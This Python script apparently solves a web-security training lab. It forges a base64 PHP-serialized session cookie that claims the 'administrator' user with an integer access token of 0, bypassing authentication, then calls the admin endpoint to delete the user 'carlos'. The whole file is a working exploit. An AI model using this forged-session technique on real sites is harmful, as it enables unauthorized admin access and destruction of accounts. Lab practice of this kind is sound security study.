import requests, sys, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) != 2:
        print("[-] Invalid argument!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1].strip()

    url_delete = url + '/admin/delete?username=carlos'
    cookies = {
        'session' : 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9'
    }

    r = requests.get(url_delete, cookies=cookies, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Lab solved!")
        sys.exit(-1)
    else:
        print("[-] Lab not solved!")
        sys.exit(-1)

if __name__ == "__main__":
    main()